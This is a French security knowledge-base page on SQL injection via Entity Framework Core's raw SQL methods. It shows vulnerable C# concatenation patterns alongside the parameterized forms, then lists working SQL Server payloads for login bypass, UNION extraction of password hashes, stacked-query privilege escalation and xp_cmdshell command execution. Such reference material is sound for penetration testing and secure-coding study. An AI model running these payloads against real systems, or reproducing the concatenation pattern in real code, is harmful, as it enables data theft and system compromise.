---
title: "Injection FromSqlRaw d'Entity Framework Core : SQL brut concaténé dans EF Core"
description: FromSqlRaw, ExecuteSqlRaw et SqlQueryRaw exécutent du SQL contrôlé par l'attaquant lorsque la chaîne de requête est concaténée au lieu d'être paramétrée, donnant une injection SQL dans les applications .NET.
keywords:
  - Entity Framework
  - EF Core
  - FromSqlRaw
  - ExecuteSqlRaw
  - injection SQL .NET
  - injection SQL
---

# Injection FromSqlRaw

Entity Framework Core paramètre les requêtes LINQ, mais ses méthodes SQL brutes, `FromSqlRaw`, `ExecuteSqlRaw` et `SqlQueryRaw`, exécutent la chaîne qu'on leur donne. Lorsque cette chaîne est construite par concaténation ou `string.Format`, l'entrée utilisateur se retrouve directement dans le SQL et le résultat est une injection SQL, typiquement contre SQL Server mais aussi PostgreSQL/MySQL via leurs providers EF.

## Schémas vulnérables

```csharp
// name from the request, concatenated into raw SQL
var users = db.Users
    .FromSqlRaw("SELECT * FROM Users WHERE Name = '" + name + "'")
    .ToList();

db.Database.ExecuteSqlRaw("UPDATE Users SET Role='user' WHERE Id=" + id);
```

Le suffixe `*Raw` est l'indice : ces méthodes traitent la chaîne telle quelle. Les formes paramétrées (`FromSqlRaw("... = {0}", name)` avec des espaces réservés, ou les variantes interpolées `FromSql`/`FromSqlInterpolated`) envoient les valeurs sous forme de `DbParameter`.

## Exploitation

Pour le contexte de chaîne entre apostrophes, l'évasion et l'union standard fonctionnent. SQL Server est le backend courant, utilisez donc sa syntaxe :

```
' OR '1'='1
' UNION SELECT Id, Username, PasswordHash FROM Users --
'; EXEC xp_cmdshell 'whoami' --        (if xp_cmdshell is enabled and privileges allow)
```

Pour un contexte numérique `Id` :

```
1; UPDATE Users SET Role='admin' WHERE Id=1 --
0 UNION SELECT Id, Username, PasswordHash FROM Users
```

Le séparateur de commandes `;` de SQL Server autorise les **requêtes empilées** sur la même connexion, donc `UPDATE`/`INSERT`/`EXEC` après un `SELECT` sont souvent viables, contrairement à de nombreuses configurations de pilote MySQL. `FromSqlRaw` attend que les colonnes projetées correspondent aux propriétés mappées de l'entité, alignez donc un `SELECT` de `UNION` avec l'ordre des colonnes de l'entité (complétez avec `NULL`/`CAST`).

L'extraction par erreur via les erreurs de type `CONVERT()`/`CAST()` est fiable sur SQL Server lorsque les exceptions remontent dans la réponse.

## Outils

- **sqlmap** : automatiser l'extraction une fois qu'un paramètre FromSqlRaw ou ExecuteSqlRaw est injectable.
- **Burp Repeater et Intruder** : délivrer des charges utiles d'évasion et d'UNION au paramètre SQL brut.

## Références

- [Documentation EF Core : Raw SQL queries](https://learn.microsoft.com/en-us/ef/core/querying/sql-queries)
- [PayloadsAllTheThings : MSSQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
